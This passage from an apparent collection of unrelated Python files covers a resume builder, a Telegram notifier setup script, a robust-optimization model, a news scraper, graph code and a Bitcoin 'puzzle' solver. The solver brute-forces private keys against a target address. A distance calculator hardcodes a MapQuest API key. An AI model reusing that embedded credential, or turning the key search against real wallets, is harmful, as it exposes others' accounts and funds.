layout.addWidget(self.exp_edit)\r\n        layout.addWidget(self.skills_label)\r\n        layout.addWidget(self.skills_edit)\r\n        layout.addWidget(self.submit_button)\r\n        layout.addWidget(self.import_button)\r\n\r\n        self.setLayout(layout)\r\n        self.update()\r\n\r\n\r\n    def import_resume(self):\r\n        options = QFileDialog.Options()\r\n        file_path, _ = QFileDialog.getOpenFileName(self, \"Import Resume\", \"\", \"PDF Files (*.pdf)\", options=options)\r\n        if file_path:\r\n            self.extract_resume_data(file_path)\r\n\r\n    def extract_information_from_text(self, text):\r\n        # Define patterns to search for relevant information\r\n        patterns = {\r\n            'name': r'Full Name:\\s*(.*)',\r\n            'email': r'Email:\\s*(.*)',\r\n            'phone': r'Phone:\\s*(.*)',\r\n            'address': r'Address:\\s*(.*)',\r\n            'education': r'Education:(.*?)Experience:',\r\n            'experience': r'Experience:(.*?)Skills:',\r\n            'skills': r'Skills:(.*)'\r\n        }\r\n\r\n        information = {}\r\n\r\n        # Extract information using regular expressions\r\n        for key, pattern in patterns.items():\r\n            match = re.search(pattern, text, re.DOTALL | re.IGNORECASE)\r\n            if match:\r\n                information[key] = match.group(1).strip()\r\n\r\n        return information\r\n\r\n    def extract_resume_data(self, file_path):\r\n        doc = fitz.open(file_path)\r\n        text = \"\"\r\n        for page in doc:\r\n            text += page.get_text()\r\n        doc.close()\r\n\r\n        # Extract information from text\r\n        information = self.extract_information_from_text(text)\r\n\r\n        # Populate text fields\r\n        self.name_edit.setText(information.get('name', ''))\r\n        self.email_edit.setText(information.get('email', ''))\r\n        self.phone_edit.setText(information.get('phone', ''))\r\n        self.address_edit.setText(information.get('address', ''))\r\n        self.edu_edit.setText(information.get('education', ''))\r\n        self.exp_edit.setText(information.get('experience', ''))\r\n        self.skills_edit.setText(information.get('skills', ''))    \r\n\r\n    def generate_resume(self):\r\n        name = self.name_edit.text()\r\n        email = self.email_edit.text()\r\n        phone = self.phone_edit.text()\r\n        address = self.address_edit.text()\r\n        education = self.edu_edit.toPlainText()\r\n        experience = self.exp_edit.toPlainText()\r\n        skills = self.skills_edit.toPlainText()  # Use toPlainText() instead of text\r\n\r\n        # Get the file save location from the user\r\n        options = QFileDialog.Options()\r\n        file_path, _ = QFileDialog.getSaveFileName(self, \"Save Resume\", f\"{name}_resume.pdf\", \"PDF Files (*.pdf)\", options=options) #For docx replace with _resume.docx\", \"DOCX Files (*.docx)\"\r\n\r\n        if file_path:\r\n       ",
    "import sys\nsys.dont_write_bytecode = True\n\nfrom notify_utils import *\nimport subprocess, shlex, notify, json, requests, os\n\ntry:\n\n    if len(sys.argv) == 2 and sys.argv[1] != \"-u\" or len(sys.argv) > 2:\n        ntf_error(\"Wrong arguments.\", sugg=f\"Please use {PYTHON_VERSION} setup.py\")\n\n    isupdate = len(sys.argv) == 2 and sys.argv[1] == \"-u\"\n\n    if not isupdate: ntf_info(\"\\nThanks for downloading notify2!\\n\\nBase repo: https://github.com/Zanzibarr/Notify2\\nBeginning setup...\\n\")\n\n    if HOME == \"/var/root\":\n        ntf_error(\"Please run the setup in user mode.\")\n\n    #---------------------------------------------------------------\n    #region                  CONFIGURATIONS                        -\n    #---------------------------------------------------------------\n\n    if not isupdate: \n        \n        config = False\n        if os.path.exists(CONFIG_PATH):\n\n            ntf_info(f\"Found configuration file located in '{CONFIG_PATH}'.\")\n\n            if ntf_input(\"Wish to use this configuration file?\", [\"y\", \"n\"]) == \"y\":\n                config = True\n\n        if not config and any(os.path.exists(config) for config in OLD_CONFIG_PATHS):\n\n            old_path = OLD_CONFIG_PATHS[0] if os.path.exists(OLD_CONFIG_PATHS[0]) else OLD_CONFIG_PATHS[1]\n\n            ntf_info(f\"Found configuration file from a past version located in '{old_path}'.\")\n\n            if ntf_input(\"Wish to use this configuration file?\", [\"y\", \"n\"]) == \"y\":\n                ntf_info(\"Loading old configuration.\")\n                subprocess.run(shlex.split(f\"cp {old_path} {CONFIG_PATH}\"), check=True)\n                config = True\n\n        skip = False\n\n        if not config:\n\n            if ntf_input(\"wish to create a configuration file?\", [\"y\", \"n\"]) == \"n\":\n                ntf_warn(\"Without a configuration file you would need to specify each time the telegram API token and the chat you wish to send the message to.\")\n                ntf_info(\"No configuration file created.\")\n                skip = True\n\n        if not config:\n\n            ntf_info(\"Creating a new configuration file.\")\n            with open(CONFIG_PATH, \"w\") as f:\n                f.write(json.dumps({\"def\":\"default\", \"profiles\":{}}, indent=4))\n\n        if not skip:\n\n            with open(CONFIG_PATH, \"r\") as f:\n                configuration = json.loads(f.read())\n\n            default = configuration[\"def\"]\n            profiles = configuration[\"profiles\"]\n\n            if len(profiles) > 0:\n\n                ntf_info(f\"Profiles available: {list(profiles.keys())}\")\n\n                choices = [key for key in profiles.keys()]\n                choices.append(\"-new\")\n                name = ntf_input(\"Choose the profile to use (-new to create a new one): \", choices)\n\n            new_def = True\n\n            if len(profiles) == 0 or name == \"-new\":\n\n                ntf_info(\"Creating a new profile.\")\n                name = ntf_input(\"Insert the name of the profile to create\")\n                token = ntf_input(\"Insert the telegram API token of the bot to use.\")\n                chat = ntf_input(\"Insert the default chat id to associate to the profile ('-q' to ignore this for now): \")\n                while not requests.post(f\"https://api.telegram.org/bot{token}/getMe\").json()[\"ok\"]:\n                    ntf_warn(\"The token specified isn't associated to a telegram bot, please use a valid token.\")\n                    token = ntf_input(\"Insert the telegram API token of the bot to use. ('-q' to quit the setup) \")\n\n                    if token == \"-q\":\n                        ntf_warn(\"Profile not created.\", sugg=\"Using 'default' as default profile.\")\n                        new_def = False\n                        break\n\n                chat = \"\" if chat == \"-q\" else chat\n                if new_def: notify.write_conf_profile(name=name, token=token, to_chat_id=chat)\n            \n            if new_def:\n                ntf_info(f\"Setting {name} as default profile.\")\n                notify.set_default_profile(name=name)\n\n    #endregion\n\n\n    #---------------------------------------------------------------\n    #region                    MOVING FILES                        -\n    #---------------------------------------------------------------\n\n    if not os.path.exists(DEST_PATH):\n        ntf_info(f\"Folder {DEST_PATH} not found, creating one.\")\n        os.mkdir(DEST_PATH)\n\n    ntf_info(f\"Moving files to base path: {DEST_PATH}\")\n    for file in os.listdir(BASE_PATH):\n        subprocess.run([\"cp\", f\"{BASE_PATH}/{file}\", f\"{DEST_PATH}/{file}\"], check=True)\n\n    if not os.path.exists(f\"{DEST_PATH}/python_module\"):\n        os.mkdir(f\"{DEST_PATH}/python_module\")\n\n    subprocess.run([\"mv\", f\"{DEST_PATH}/notify.py\", f\"{DEST_PATH}/python_module/notify.py\"], check=True)\n\n    #endregion\n\n    if isupdate: \n        exit(0)\n\n    #---------------------------------------------------------------\n    #region                   RC FILES EDIT                        -\n    #-------------------------------------------------------",
    "'''\u4e24\u9636\u6bb5\u9c81\u68d2\u4f18\u5316CC&G\u7b97\u6cd5'''\nimport numpy as np\nimport gurobipy as gp\nimport matplotlib.pyplot as plt\n\n# \u4e0b\u754c\u548c\u4e0a\u754c\u96c6\u5408\nub_set = []\nlb_set = []\n\n# i \u5904\u5efa\u9020\u4ed3\u5e93\u7684\u8d39\u7528\nf = np.array([400,414,326]) \n\n# i \u5904\u4ed3\u5e93\u7684\u5355\u4f4d\u5bb9\u91cf\u4ea7\u751f\u7684\u8d39\u7528\na = np.array([18,25,20])\n\n# i->j \u8fd0\u8f93\u4ea7\u751f\u7684\u8d39\u7528\nc = np.array([[22,33,24],\n              [33,23,30],\n              [20,25,27]])\n\n'''CC&G\u7b97\u6cd5\u6a21\u578b'''\n\n## \u4e3b\u95ee\u9898\nMP = gp.Model(\"CC&G\u4e3b\u95ee\u9898\")\n# i \u5904\u4ed3\u5e93\u662f\u5426\u5efa\u9020\ny = MP.addVars(range(3), vtype=gp.GRB.BINARY, name=\"y\")\n\n# i \u5904\u4ed3\u5e93\u7684\u5bb9\u91cf\nz = MP.addVars(range(3), lb=0, vtype=gp.GRB.CONTINUOUS, name=\"z\")\n\n# i->j \u7684\u8fd0\u8f93\nx_SP = MP.addVars([0,1,2],[0,1,2], lb=0, vtype=gp.GRB.CONTINUOUS, name=\"x_SP\")\n\n# \u7b2c\u4e00\u9636\u6bb5\u95ee\u9898\nyita = MP.addVar(vtype=gp.GRB.CONTINUOUS, name=\"yita\")\n\n# \u76ee\u6807\u51fd\u6570\nMP_Obj = gp.quicksum(f[i] * y[i] + a[i] * z[i] for i in range(3))\nMP_Obj = MP_Obj + yita\n\nMP.setObjective(MP_Obj, gp.GRB.MINIMIZE)\n\n# MP \u521d\u59cb\u7ea6\u675f\u6761\u4ef6\nMP.addConstrs((z[i] <= 800*y[i] for i in range(3)), \"z(i) <= 800*y(i)\")\nMP.addConstr(sum(z[i] for i in range(3)) >= 772, \"sum_z >= 772\")\ninit_d = [206,274,220]\n# (2)\nfor i in range(3):\n    row_sum_x = sum(x_SP[i,j] for j in range(3))\n    MP.addConstr(row_sum_x <= z[i], name=f\"sum_x_{i} <= z{i}\")\n# (3)\nfor j in range(3):\n    col_sum_x = sum(x_SP[i,j] for i in range(3))\n    MP.addConstr(col_sum_x >= init_d[j], name=f\"sum_x_{j} >= opt_d{j}\")\n\n\n## \u5b50\u95ee\u9898\nSP = gp.Model(\"CC&G\u5b50\u95ee\u9898\")\n\n# i->j \u7684\u8fd0\u8f93\nx = SP.addVars([0,1,2], [0,1,2], lb=0, vtype=gp.GRB.CONTINUOUS, name=\"x\")\n\n# \u4e0d\u786e\u5b9a\u96c6\ng = SP.addVars([0,1,2], lb=0, ub=1, vtype=gp.GRB.CONTINUOUS, name=\"g\" )\n#g = SP.addVars([0,1,2], vtype=gp.GRB.BINARY, name=\"g\" )\nd = SP.addVars([0,1,2], lb=0, ub=gp.GRB.INFINITY, vtype=gp.GRB.CONTINUOUS, name=\"d\" )\nSP.addConstr(d[0] == 206 + 40 * g[0], name=\"d0 = 206 + 40*g0\")\nSP.addConstr(d[1] == 274 + 40 * g[1], name=\"d1 = 274 + 40*g1\")\nSP.addConstr(d[2] == 220 + 40 * g[2], name=\"d2 = 220 + 40*g2\")\nSP.addConstr(sum(g[i] for i in range(3)) <= 3)\nSP.addConstr(g[0] + g[1] + g[2] <= 1.8, name=\"g0 + g1 + g2 <= 1.8\")\nSP.addConstr(g[0] + g[1] <= 1.2, name=\"g0 + g1 <= 1.2\")\nd_base = np.array([206,274,220])\n\n# \u4e0a\u4e0b\u754c\nUB = float(\"inf\")\nLB = float(\"-inf\")\n\n# \u8fed\u4ee3\u6b21\u6570\nk = 0;\n\n# \u4e3b\u5faa\u73af\nwhile (UB - LB > 1e-5):\n\n    print(\"\u7b2c\",k,\"\u6b21\u8fed\u4ee3\")\n    print(\"\u4e0a\u754c\uff1a\",UB)\n    print(\"\u4e0b\u754c\uff1a\",LB)\n    print(\"---------------------\")\n    print(\"       MP k          \")\n    print(\"---------------------\")\n\n    # \u4e3b\u95ee\u9898\u6c42\u89e3\n    MP.optimize()\n\n    # \u83b7\u53d6 z \u7684\u6700\u4f18\u503c\n    z_opt = np.array([z[i].X for i in range(3)])\n    print(z_opt)\n    # \u66f4\u65b0\u4e0b\u754c\n    LB = max(LB,MP.objVal)\n    lb_set.append(LB)\n\n    # \u5b50\u95ee\u9898\u6839\u636e\u4e3b\u95ee\u9898\u7684\u89e3\u52a0\u7ea6\u675f\n    if k > 0:\n        # \u5220\u9664\u4e4b\u524d\u7684\u5b50\u95ee\u9898\u7ea6\u675f\n        SP.remove(sp1)\n        SP.remove(sp3)\n        SP.remove(sp4)\n        SP.remove(sp5)\n        SP.remove(sp6)\n        SP.remove(sp7)\n        SP.remove(sp8)\n        SP.remove(sp9)\n        SP.remove(v)\n        SP.remove(w)\n        SP.remove(pi)\n        SP.remove(h)\n        SP.update()\n   \n   # KKT \u5904\u7406\u540e\u7684\u7ea6\u675f\n    M = 1e5 # \u5927 M\n    pi = SP.addVars([0,1,2], lb=-gp.GRB.INFINITY, ub=0, vtype=gp.GRB.CONTINUOUS, name=\"pi\")\n    theta = SP.addVars([0,1,2], lb=-gp.GRB.INFINITY, ub=0, vtype=gp.GRB.CONTINUOUS, name=\"theta\")\n    v = SP.addVars([0,1,2], vtype=gp.GRB.BINARY, name=\"v\")\n    w = SP.addVars([0,1,2], vtype=gp.GRB.BINARY, name=\"w\")\n    h = SP.addVars(range(3), range(3), vtype=gp.GRB.BINARY, name=\"h\")\n\n    \n    ## \u5bf9\u5076\u5c1d\u8bd5\n    for i in range(3):\n        for j in range(3):\n            SP.addConstr((pi[i] - theta[j] <= c[i][j]), name=f\"pi_{i}-theta_{j} <= c_{i}_{j}\")\n\n    sp1 = SP.addConstr(sum(g[i] for i in range(3)) <= 3)     \n\n    # \u4e92\u8865\u677e\u7d27\u6027\n    sp3 = SP.addConstrs(pi[i] - theta[j] <= c[i][j] for i in range(3) for j in range(3))\n    sp4 = SP.addConstrs(-pi[i] <= M*v[i] for i in range(3))\n    sp5 = SP.addConstrs(z_opt[i] - sum(x[i,j] for j in range(3)) <= M*(1-v[i]) for i in range(3) for j in range(3))\n    sp6 = SP.addConstrs(-theta[j] <= M*w[j] for j in range(3))\n    sp7 = SP.addConstrs(sum(x[i,j] for i in range(3)) - d[j] <= M*(1-w[j]) for j in range(3))\n    sp8 = SP.addConstrs(x[i,j] <= M*h[i,j] for i in range(3) for j in range(3))\n    sp9 = SP.addConstrs(c[i][j] - pi[i] + theta[j] <= M*(1-h[i,j]) for i in range(3) for j in range(3))\n\n    \n    SP_Obj = sum(z_opt[i]*pi[i] for i in range(3)) - sum(d[j]*theta[j]  for j in range(3))\n    \n    # \u5b50\u95ee\u9898\u76ee\u6807\u51fd\u6570\n    SP_Obj = sum(c[i,j]*x[i,j] for i in range(3) for j in range(3))\n\n\n    SP.setObjective(SP_Obj, gp.GRB.MAXIMIZE)\n\n    print(\"---------------------\")\n    print(\"       SP k          \")\n    print(\"---------------------\")\n    # \u5b50\u95ee\u9898\u6c42\u89e3\n    SP.optimize()\n\n\n    # \u8fed\u4ee3\u6b21\u6570\u7d2f\u52a0\n    k = k + 1\n    \n    if SP.Status != gp.GRB.INFEASIBLE:\n        # \u83b7\u53d6 d \u7684\u6700\u4f18\u503c\n        # opt_d = np.array([d_base[i] + g_c[i].X/x_dual[i+3].X for i in range(3)])\n        opt_d = np.array([d[i].X for i in range(3)])\n        y_stage1 = np.array([y[i].X for i in range(3)])\n        z_stage1 = np.array([z[i].X for i in range(3)])\n\n\n    # \u589e\u52a0\u6700\u4f18\u5272\u548c\u53ef\u884c\u5272\n    if SP.status == gp.GRB.OPTIMAL:\n        # \u66f4\u65b0\u4e0a\u754c\n        UB = min(UB,SP.ObjVal + sum(f[i]*y_stage1[i] + a[i]*z_stage1[i] for i in range(3)))\n        ub_set.append(UB)\n\n        # \u6839\u636e\u8bba\u6587\u516c\u5f0f (12)\u3001(13) \u6dfb\u52a0\u7ea6\u675f\n        var_name = f'x{k}'\n        new_x ",
    "from hashlib import sha256, new, sha3_512\r\nfrom base58 import b58encode\r\nfrom binascii import hexlify, unhexlify\r\nfrom ecdsa import SigningKey, SECP256k1\r\nfrom random import randint\r\nfrom json import loads\r\nfrom os import system, name\r\nfrom time import time\r\n\r\nclass Puzzle():\r\n    def __init__(self):\r\n        self.count = 0\r\n        self.found = False\r\n        self.GREEN = '\\033[32m'\r\n        self.DEFAULT = '\\033[39m'\r\n        self.RED = '\\033[31m'\r\n        system('cls' if name == 'nt' else 'clear')\r\n        self.print_art()\r\n        puzzle_length = self.get_puzzle_length()\r\n        try:\r\n            cmd = int(input(f'Enter Puzzle Number (0 - {puzzle_length-1}): '))\r\n            if cmd >= puzzle_length:exit()\r\n        except:exit()\r\n        self.puzzle = self.get_puzzle(cmd)\r\n        self.start = int(self.puzzle['start'], 16)\r\n        self.end = int(self.puzzle['end'], 16)\r\n        self.address = self.puzzle['address']\r\n        self.reward = float(self.puzzle['reward'])\r\n        try:self.seek()\r\n        except:pass\r\n\r\n    def print_art(self):\r\n        print(f'''{self.RED} \u2584\u2584\u2584\u2584    \u2588\u2588\u2593\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593    \u2588\u2588\u2593\u2588\u2588\u2588   \u2588    \u2588\u2588 \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\r\n\u2593\u2588\u2588\u2588\u2588\u2588\u2584 \u2593\u2588\u2588\u2592\u2593  \u2588\u2588\u2592 \u2593\u2592   \u2593\u2588\u2588\u2591  \u2588\u2588\u2592 \u2588\u2588  \u2593\u2588\u2588\u2592\u2592 \u2592 \u2592 \u2584\u2580\u2591\u2592 \u2592 \u2592 \u2584\u2580\u2591\r\n\u2592\u2588\u2588\u2592 \u2584\u2588\u2588\u2592\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2591 \u2592\u2591   \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2593\u2588\u2588  \u2592\u2588\u2588\u2591\u2591 \u2592 \u2584\u2580\u2592\u2591 \u2591 \u2592 \u2584\u2580\u2592\u2591 \r\n\u2592\u2588\u2588\u2591\u2588\u2580  \u2591\u2588\u2588\u2591\u2591 \u2593\u2588\u2588\u2593 \u2591    \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592\u2593\u2593\u2588  \u2591\u2588\u2588\u2591  \u2584\u2580\u2592   \u2591  \u2584\u2580\u2592   \u2591\r\n\u2591\u2593\u2588  \u2580\u2588\u2593\u2591\u2588\u2588\u2591  \u2592\u2588\u2588\u2592 \u2591    \u2592\u2588\u2588\u2592 \u2591  \u2591\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2593 \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\r\n\u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592\u2591\u2593    \u2592 \u2591\u2591      \u2592\u2593\u2592\u2591 \u2591  \u2591\u2591\u2592\u2593\u2592 \u2592 \u2592 \u2591\u2592\u2592 \u2593\u2591\u2592\u2591\u2592\u2591\u2592\u2592 \u2593\u2591\u2592\u2591\u2592\r\n\u2592\u2591\u2592   \u2591  \u2592 \u2591    \u2591       \u2591\u2592 \u2591     \u2591\u2591\u2592\u2591 \u2591 \u2591 \u2591\u2591\u2592 \u2592 \u2591 \u2592\u2591\u2591\u2592 \u2592 \u2591 \u2592\r\n \u2591    \u2591  \u2592 \u2591  \u2591         \u2591\u2591        \u2591\u2591\u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591\u2591 \u2591 \u2591 \u2591 \u2591\r\n \u2591       \u2591                          \u2591       \u2591 \u2591      \u2591 \u2591    \r\n      \u2591                                   \u2591        \u2591        {self.DEFAULT}v0.1.2\\n\\n''')\r\n\r\n\r\n\r\n    def get_puzzle_length(self):\r\n        return len(loads(open('data.json').read()))\r\n\r\n    def get_puzzle(self, n):\r\n        data = loads(open('data.json').read())[str(n)]\r\n        return data\r\n\r\n    def ripemd160(self, x):\r\n        d = new('ripemd160')\r\n        d.update(x)\r\n        return d\r\n\r\n    def seek(self):\r\n        while True:\r\n            t = time()\r\n            for i in range(5000):\r\n                key = f'{randint(self.start, self.end):x}'\r\n                key = '0'*(64-len(key)) + key\r\n                priv_key = bytes.fromhex(key)\r\n                fullkey1 = hexlify(priv_key).decode()\r\n                fullkey = '80' + hexlify(priv_key).decode() +'01'\r\n                sha256a = sha256(unhexlify(fullkey)).hexdigest()\r\n                sha256b = sha256(unhexlify(sha256a)).hexdigest()\r\n                WIF = b58encode(unhexlify(fullkey+sha256b[:8]))\r\n                sk = SigningKey.from_string(priv_key, curve=SECP256k1)\r\n                vk = sk.get_verifying_key()\r\n                key_bytes = hexlify(vk.to_string()).decode()\r\n                key = ('0x' + hexlify(sk.verifying_key.to_string()).decode('utf-8'))\r\n                half_len = len(key_bytes) // 2\r\n                key_half = key_bytes[:half_len]\r\n                last_byte = int(key[-1], 16)\r\n                bitcoin_byte = '02' if last_byte % 2 == 0 else '03'\r\n                publ_key = bitcoin_byte + key_half\r\n                hash160 = self.ripemd160(sha256(unhexlify(publ_key)).digest()).digest()\r\n                publ_addr_a = b\"\\x00\" + hash160\r\n                checksum = sha256(sha256(publ_addr_a).digest()).digest()[:4]\r\n                publ_addr_b = b58encode(publ_addr_a + checksum)\r\n                priv = WIF.decode()\r\n                pub = publ_addr_b.decode()\r\n                if pub == self.address:\r\n                    open('found.txt', 'a').write(f'{priv} {pub}\\n')\r\n                    self.found = True\r\n            self.count += 5000\r\n            print(f'{self.RED if not self.found else self.GREEN}[+] Checked : {self.count}{self.DEFAULT}\\tReward : {self.reward:.02f} BTC\\tSpeed : {5000 * (1/(time()-t)):.02f}/Second')\r\n\r\nif __name__ == '__main__':\r\n    Puzzle()",
    "import requests\r\nfrom math import radians, cos, sin, asin, sqrt\r\n\r\n'''Signature of location finders'''\r\ndef firstloc():\r\n    key='0ztWYr4oN8ISFhBjEAUAKjUyuVUwX9mS'\r\n    url='http://www.mapquestapi.com/geocoding/v1/address?key='\r\n    loc=input('Enter your first location :')\r\n    main_url=url+key+'&location='+loc\r\n    #print(main_url)\r\n\r\n    r=requests.get(main_url)\r\n    data=r.json()['results'][0]\r\n    location=data['locations'][0]\r\n    #print(location)\r\n\r\n    city=location['adminArea5'] #key\r\n    state=location['adminArea3']\r\n    country=location['adminArea1']\r\n    zipcode=location['geocodeQualityCode']\r\n    lat=location['latLng']['lat']\r\n    lon=location['latLng']['lng']\r\n\r\n    print('Location :',loc)\r\n    print('City :',city)\r\n    print('State :',state)\r\n    print('Country :',country)\r\n    #print('Postal Code :',zipcode)\r\n    print('Latitude :',lat)\r\n    print('Longitude :',lon)\r\n    print('\\n\\n')\r\n    return lat,lon,loc;\r\n    \r\n\r\ndef secondloc():\r\n    key='0ztWYr4oN8ISFhBjEAUAKjUyuVUwX9mS'\r\n    url='http://www.mapquestapi.com/geocoding/v1/address?key='\r\n    loc=input('Enter your second location :')\r\n    main_url=url+key+'&location='+loc\r\n    #print(main_url)\r\n\r\n    r=requests.get(main_url)\r\n    data=r.json()['results'][0]\r\n    location=data['locations'][0]\r\n    #print(location)\r\n\r\n    city=location['adminArea5']\r\n    state=location['adminArea3']\r\n    country=location['adminArea1']\r\n    zipcode=location['geocodeQualityCode']\r\n    lat=location['latLng']['lat']\r\n    lon=location['latLng']['lng']\r\n\r\n    print('Location :',loc)\r\n    print('City :',city)\r\n    print('State :',state)\r\n    print('Country :',country)\r\n    #print('Postal Code :',zipcode)\r\n    print('Latitude :',lat)\r\n    print('Longitude :',lon)\r\n    print('\\n\\n')\r\n    return lat,lon,loc;\r\n\r\n\r\ndef distance(lat1, lat2, lon1, lon2):\r\n     \r\n    # The math module contains a function named\r\n    # radians which converts from degrees to radians.\r\n    lon1 = radians(lon1)\r\n    lon2 = radians(lon2)\r\n    lat1 = radians(lat1)\r\n    lat2 = radians(lat2)\r\n      \r\n    # Haversine formula\r\n    dlon = lon2 - lon1\r\n    dlat = lat2 - lat1\r\n    a = sin(dlat / 2)**2 + cos(lat1) * cos(lat2) * sin(dlon / 2)**2\r\n \r\n    c = 2 * asin(sqrt(a))\r\n    \r\n    # Radius of earth in kilometers. Use 3956 for miles\r\n    r = 6371\r\n      \r\n    # calculate the result\r\n    return(c * r)\r\n     \r\ndef time(time):\r\n    #time = float(input(\"Input time in seconds: \"))\r\n    day = time // (24 * 3600)\r\n    time = time % (24 * 3600)\r\n    hour = time // 3600\r\n    time %= 3600\r\n    minutes = time // 60\r\n    time %= 60\r\n    seconds = time\r\n    print(\"ETA=d:h:m:s-> %d:%d:%d:%d\" % (day, hour, minutes, seconds))\r\n    \r\n\r\n'''main'''\r\nprint(\"==================-------------------=====================\")\r\nprint(\"==================DISTANCE CALCULATOR=====================\")\r\nprint(\"==================-------------------=====================\\n\\n\")\r\nlat1,lon1,loc1=firstloc();\r\nlat2,lon2,loc2=secondloc();\r\nprint(\"Aerial Distance:\",distance(lat1, lat2, lon1, lon2), \"K.M\")\r\nroad_d=distance(lat1, lat2, lon1, lon2)\r\nroad=road_d+road_d*0.3\r\nprint(\"Road Distance:\" ,road,\"K.M\\n\")\r\n\r\nprint(\"Select Your mode of Transport\\n\")\r\nprint(\"1. Walk \\n2.Motorcycle\\n3.Car\\n4.Train\\n5.Aeroplane\")\r\nn=int(input(\"Enter Your Choice:\"))\r\nif(n==1):\r\n    T=road/9\r\n    T=T*3600\r\n    time(T)\r\n        \r\nelif(n==2):\r\n    T=road/60\r\n    T=T*3600\r\n    time(T)\r\n    \r\nelif(n==3):\r\n    T=road/80\r\n    T=T*3600\r\n    time(T)\r\n    \r\nelif(n==4):\r\n    T=road/110\r\n    T=T*3600\r\n    time(T)\r\n    \r\nelif(n==5):\r\n    T=road_d/700 #road_d = areial\r\n    T=T*3600\r\n    time(T)\r\n    \r\nelse:\r\n    print(\"Enter a correct Choice--\")\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "import requests\r\nfrom bs4 import BeautifulSoup\r\n\r\nclass Scraper:\r\n    def __init__(self):\r\n        pass\r\n\r\n    def get_content(self, url, tag_html, element_class = None):\r\n        request = requests.get(url)\r\n        soup = BeautifulSoup(request.text, 'html.parser')\r\n        \r\n        if element_class is not None: \r\n            text = soup.find_all(tag_html, element_class)\r\n        else:\r\n            text = soup.find_all(tag_html) \r\n            \r\n        return text\r\n\r\n    def extract_news(self, text, title_tag, date_tag):\r\n        news_list = []\r\n        \r\n        for news in text:\r\n            title = news.find(title_tag)\r\n            date = news.find(date_tag)\r\n            \r\n            if title is not None and date is not None:\r\n                title = title.text.strip()\r\n                date = date.text.strip()\r\n            \r\n                news = 'Titulo: ' + title + ', data: ' + date\r\n                news_list.append(news)\r\n\r\n        return news_list\r\n\r\n    def show_news(self, news_list):\r\n        for news in news_list:\r\n            print(news)\r\n            print('*' * 60)\r\n",
    "import itertools\nimport numpy as np\nfrom cffi import FFI\n\n\nffi = FFI()\nffi.set_source(\"_test\", \"\"\"               \nint graphDistTo( int i0, int* dj,int lendj, int* edges, int nedges)\n{\n    for(int i =0 ;i < lendj ; i++)\n    {\n        dj[i] = 1000000;//Positive infinity\n    }\n    \n    dj[i0] = 0;\n    \n    int hasChanged = 1;\n    int niter = 0;\n    while( hasChanged == 1)\n    {\n     niter = niter+1;\n     hasChanged = 0;\n    //edges already contain reverse edges\n    for( int i = 0 ; i < nedges ; i++)\n    {\n       int e0 = edges[2*i];\n       int e1 = edges[2*i+1];\n       int min = dj[e0];\n       if( dj[e1] + 1 < min)\n       {\n         min = dj[e1]+1;\n         hasChanged = 1;\n       }\n       dj[e0] = min;\n       \n                       \n    }\n    }\n    return niter;\n}\n\nint batchGraphDistTo( int* ind,int* revind, int nbind, int* dj, int lendj, int* edges, int nedges )              \n{\n    int max = -1;\n    for( int k = 0 ; k < nbind ; k++ )\n    {\n      int i0 = ind[k];\n      int j0 = revind[k];\n      if (i0 == j0) continue;\n      graphDistTo(i0,dj,lendj,edges,nedges);\n      if( dj[j0] > max)\n      {\n        max = dj[j0];\n      }      \n    }\n    return max;\n}\n\n\"\"\")\nffi.cdef(\"\"\"int graphDistTo(int, int*,int,int*,int);\"\"\")\nffi.cdef(\"\"\"int batchGraphDistTo( int* ind,int* revind, int nbind, int* dj, int lendj, int* edges, int nedges );\"\"\")\nffi.compile()\n\nfrom _test import lib     # import the compiled library\n\n\n\n'''Copy pasted and adapted from https://www.geeksforgeeks.org/building-an-undirected-graph-and-finding-shortest-path-using-dictionaries-in-python/'''\n# Code only use to check computation by brute-force\n# Python implementation to find the \n# shortest path in the graph using \n# dictionaries \n \n# Function to find the shortest\n# path between two nodes of a graph\ndef BFS_SP(graph, start, goal):\n    explored = []\n     \n    # Queue for traversing the \n    # graph in the BFS\n    queue = [[start]]\n     \n    # If the desired node is \n    # reached\n    if start == goal:\n        #print(\"Same Node\")\n        return list(start)\n     \n    # Loop to traverse the graph \n    # with the help of the queue\n    while queue:\n        path = queue.pop(0)\n        node = path[-1]\n         \n        # Condition to check if the\n        # current node is not visited\n        if node not in explored:\n            neighbours = graph[node]\n             \n            # Loop to iterate over the \n            # neighbours of the node\n            for neighbour in neighbours:\n                new_path = list(path)\n                new_path.append(neighbour)\n                queue.append(new_path)\n                 \n                # Condition to check if the \n                # neighbour node is the goal\n                if neighbour == goal:\n                    #print(\"Shortest path = \", *new_path)\n                    return new_path\n            explored.append(node)\n \n    # Condition when the nodes \n    # are not connected\n    #print(\"So sorry, but a connecting path doesn't exist :(\")\n    return list()\n\ndef shortest_path(graph, node1, node2):\n    path_list = [[node1]]\n    path_index = 0\n    # To keep track of previously visited nodes\n    previous_nodes = {node1}\n    if node1 == node2:\n        return path_list[0]\n        \n    while path_index < len(path_list):\n        current_path = path_list[path_index]\n        last_node = current_path[-1]\n        next_nodes = graph[last_node]\n        # Search goal node\n        if node2 in next_nodes:\n            current_path.append(node2)\n            return current_path\n        # Add new paths\n        for next_node in next_nodes:\n            if not next_node in previous_nodes:\n                new_path = current_path[:]\n                new_path.append(next_node)\n                path_list.append(new_path)\n                # To avoid backtracking\n                previous_nodes.add(next_node)\n        # Continue to next path in list\n        path_index += 1\n    # No path is found\n    return []\n\n\"\"\"End copy paste\"\"\"\n\n\n\nclass MySet:\n    def __init__(self, v) :\n        self.parent = None\n        self.v = v\n        self.rang = 0\n\n    @staticmethod\n    def find( x ):\n        if x.parent == None:\n            return x\n        return MySet.find( x.parent )\n    \n    @staticmethod\n    def union( x,y):\n        xrac = MySet.find( x )\n        yrac = MySet.find( y )\n        if xrac != yrac :\n            if xrac.rang < yrac.rang:\n                xrac.parent = yrac\n            else:\n                yrac.parent = xrac\n                if xrac.rang == yrac.rang:\n                    xrac.rang = yrac.rang + 1 \n\n    